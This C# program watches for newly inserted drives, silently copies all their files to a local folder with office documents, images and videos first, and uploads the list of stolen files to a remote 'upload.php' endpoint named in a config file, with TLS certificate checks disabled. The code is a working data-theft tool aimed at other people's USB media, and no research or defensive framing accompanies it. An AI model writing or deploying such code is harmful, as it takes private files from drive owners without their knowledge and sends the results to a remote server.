using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

String SaveRoot, classRegistered, version;
String[,] copyRoot = new string[600000, 2];
bool[] registeredDrive = new bool[26];
int fileCnt = 0;
String localSaveRoot = "";
List<String[]> fileBoot = new List<string[]> { };
List<String> filePriority = new List<string> { ".xlsx", ".xls", ".pptx", ".ppt", ".png", ".jpg", ".mp4", ".ts", ".zip" };


StreamReader configFile = new StreamReader("config.txt");
SaveRoot = configFile.ReadLine();
classRegistered = configFile.ReadLine();
version = configFile.ReadLine();
configFile.Close();
Directory.CreateDirectory("Download_Buffer");

Console.WriteLine("Save to: {0} \nRequest Url: {1} \nversion: {2}", SaveRoot, classRegistered, version);

void scanDirectory(string path)
{
    DirectoryInfo currentDir = new DirectoryInfo(path);
    FileInfo[] files = currentDir.GetFiles();
    DirectoryInfo[] dirs = currentDir.GetDirectories();
    foreach (DirectoryInfo dir in dirs)
    {
        // Console.WriteLine(dir.FullName.Substring(3));
        Directory.CreateDirectory(localSaveRoot + dir.FullName.Substring(3));
        scanDirectory(dir.FullName);
    }
    foreach (FileInfo file in files)
    {
        fileCnt += 1;
        copyRoot[fileCnt, 0] = file.FullName;
        copyRoot[fileCnt, 1] = localSaveRoot + file.FullName.Substring(3);
    }
}


DriveInfo[] allDrivesG = DriveInfo.GetDrives();
Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
Console.OutputEncoding = System.Text.Encoding.Unicode;

foreach (DriveInfo item in allDrivesG)
{
    if (item.IsReady)
    {
        Encoding gbk = Encoding.GetEncoding("gb18030");
        Encoding utf8 = Encoding.GetEncoding("utf-8");
        byte[] gb = gbk.GetBytes(item.VolumeLabel);
        gb = Encoding.Convert(gbk, utf8, gb);
        Console.WriteLine(utf8.GetString(gb));
    }
    registeredDrive[item.Name[0] - 'A'] = true;
}
foreach (bool n in registeredDrive)
{ Console.WriteLine(n); }


while (true)
{
    DriveInfo[] allDrives = DriveInfo.GetDrives();
    bool[] visited = new bool[26];
    foreach (DriveInfo item in allDrives)
    {
        visited[item.Name[0] - 'A'] = true;
        if (!registeredDrive[item.Name[0] - 'A'])
        {
            if (!item.IsReady) continue;
            registeredDrive[item.Name[0] - 'A'] = true;
            Encoding gbk = Encoding.GetEncoding("gb18030");
            Encoding utf8 = Encoding.GetEncoding("utf-8");
            byte[] gb = gbk.GetBytes(item.VolumeLabel);
            gb = Encoding.Convert(gbk, utf8, gb);
            String saveFileName = $"[{(uint)(DateTime.Now - new DateTime(1970, 1, 1, 0, 0, 0, 0)).TotalSeconds}] from[{utf8.GetString(gb)}]";
            String saveDirName = SaveRoot + $"{saveFileName}\\";
            Console.WriteLine(saveDirName);
            fileCnt = 0;
            localSaveRoot = saveDirName;
            Directory.CreateDirectory(localSaveRoot);
            scanDirectory(item.Name);
            for (int i = 1; i <= fileCnt; i++)
            {
                fileBoot.Add(new string[] { copyRoot[i, 0], copyRoot[i, 1] });
            }
            fileBoot.Sort((a, b) =>
            {
                int p1 = -1000, p2 = -1000;
                for (int i = 0; i < filePriority.Count; i++)
                {
                    if (Path.GetExtension(a[0]) == filePriority[i])
                    {
                        p1 = filePriority.Count - i;
                    }
                    if (Path.GetExtension(b[0]) == filePriority[i])
                    {
                        p2 = filePriority.Count - i;
                    }
                }
                return -p1 + p2;
            });
            StreamWriter menu = new StreamWriter($"{saveFileName}.txt");
            for (int i = 0; i < fileCnt; i++)
            {
                Console.Write("from " + fileBoot[i][0] + " to " + fileBoot[i][1] + " ...");
                try
                {
                    File.Copy(fileBoot[i][0], fileBoot[i][1], true);
                    Console.WriteLine("Done");
                    menu.WriteLine(fileBoot[i][1]);
                }
                catch { continue; }
            }
            menu.Close();
            try
            {
                var handler = new HttpClientHandler();
                handler.ServerCertificateCustomValidationCallback = delegate { return true; };
                var content = new MultipartFormDataContent();
                content.Add(new ByteArrayContent(File.ReadAllBytes($"{saveFileName}.txt")), "file", Uri.EscapeDataString($"{saveFileName}.txt"));
                HttpClient client = new HttpClient(handler);
                await client.PostAsync(classRegistered + "upload.php", content);
            }
            catch { }

        }
    }
    for (int i = 0; i < 26; i++)
    {
        if (!visited[i] && registeredDrive[i])
        {
            registeredDrive[i] = false;
        }
    }
    Thread.Sleep(1000);
}
